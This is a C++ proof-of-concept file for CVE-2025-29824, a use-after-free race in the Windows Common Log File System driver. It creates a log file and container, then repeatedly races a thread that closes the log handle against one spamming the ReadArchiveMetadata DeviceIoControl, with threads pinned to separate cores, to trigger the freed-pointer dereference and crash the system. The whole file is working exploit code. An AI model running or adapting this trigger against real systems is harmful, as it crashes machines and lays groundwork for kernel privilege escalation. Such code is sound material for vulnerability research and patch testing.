// CVE-2025-29824-POC.cpp : This file contains the 'main' function. Program execution begins and ends there.
// On a vulnerable system, if CloseHandle from thread 1 and WriteLogRestartArea from thread 2 are called with good timing, it would cause a dereference to a freed pointer

#include <iostream>
#include <thread>
#include <Windows.h>
#include <clfsw32.h>

#pragma comment(lib, "Clfsw32.lib")
HANDLE freedEvent;

int main()
{
    std::wstring logFileName = L"LOG:";
    std::wstring inputName = L"C:\\temp\\test";
    logFileName += inputName;
    const char* directoryName1 = "C:\\temp";
    HANDLE logHandle = INVALID_HANDLE_VALUE;
    bool result = FALSE;

    //Creating directories with the baselog and container file
    if (CreateDirectoryA(directoryName1, NULL)) {
        printf("Directory created successfully: %s\n", directoryName1);
    }
    else {
        DWORD error = GetLastError();
        if (error == ERROR_ALREADY_EXISTS) {
            printf("The directory already exists: %s\n", directoryName1);
        }
        else {
            printf("Failed to create the directory. Error code: %lu\n", error);
            return 0;
        }
    }

    printf("Attempting to crash\n");
    printf("Current loop:");

    for (int i = 0; i < 2000; i++) {    //need to spam for chance of triggering race
        //creating BLF
        logHandle = CreateLogFile(logFileName.c_str(),
            GENERIC_WRITE | GENERIC_READ,
            FILE_SHARE_READ | FILE_SHARE_WRITE,
            NULL,
            OPEN_ALWAYS,
            0);

        //creating clfs container
        ULONGLONG cbContainer = (ULONGLONG)0x80000;
        AddLogContainer(logHandle, &cbContainer, (LPWSTR)L"C:\\temp\\container1", NULL);

        //used by Thread 2 to signal Thread 1 to start
        freedEvent = CreateEvent(NULL, FALSE, FALSE, NULL);

        //Thread 1 will close log file handle
        HANDLE hThread1 = CreateThread(NULL, 0, [](LPVOID param) -> DWORD {
            WaitForSingleObject(freedEvent, INFINITE);
            CloseHandle(param);
            return 0;
        }, logHandle, CREATE_SUSPENDED, NULL);

        //Thread 2 will repeatedly call ReadArchiveMetadata
        HANDLE hThread2 = CreateThread(NULL, 0, [](LPVOID param) -> DWORD {
            BYTE inputBuffer[0x100] = { 0 };
            BYTE outputBuffer[0x100] = { 0 };
            bool result = 0;
            result = DeviceIoControl(param, 0x80076856, inputBuffer, sizeof(inputBuffer), outputBuffer, sizeof(outputBuffer), NULL, NULL); //ReadArchiveMetadata
            SetEvent(freedEvent);
            for (int i = 0; i < 30000; i++){    //need to spam for chance of triggering race
                result = DeviceIoControl(param, 0x80076856, inputBuffer, sizeof(inputBuffer), outputBuffer, sizeof(outputBuffer), NULL, NULL); //ReadArchiveMetadata
            }
            return 0;
        }, logHandle, CREATE_SUSPENDED, NULL);

        //need separate cores to have chance of triggering race condition
        SetThreadAffinityMask(hThread1, 1);
        SetThreadAffinityMask(hThread2, 2);

        ResumeThread(hThread1);
        ResumeThread(hThread2);

        WaitForSingleObject(hThread1, INFINITE);
        WaitForSingleObject(hThread2, INFINITE);

        printf("\rCurrent loop: %d", i + 1);
        fflush(stdout);
    }
    return 0;
}
